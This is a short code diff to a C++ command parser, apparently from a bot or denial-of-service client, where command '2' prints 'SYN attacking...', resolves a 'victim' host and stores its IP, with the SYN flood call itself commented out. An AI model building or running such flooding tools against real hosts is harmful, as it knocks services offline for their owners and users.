@@ -125,9 +125,11 @@ void parseCommand(char command[])
     else if (command[0] == '2')
     {
         struct hostent *hostinfo = NULL; //Host name
+        char victim_ip[256];
         cout << "SYN attacking..." << endl;
         hostinfo = gethostbyname(victim);
-        cout << inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)) << endl;
+        sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
+        cout << victim_ip << endl;
         //synAttack(victim, 22000, victim, 80, 3);
         cout << "Done" << endl;
     }
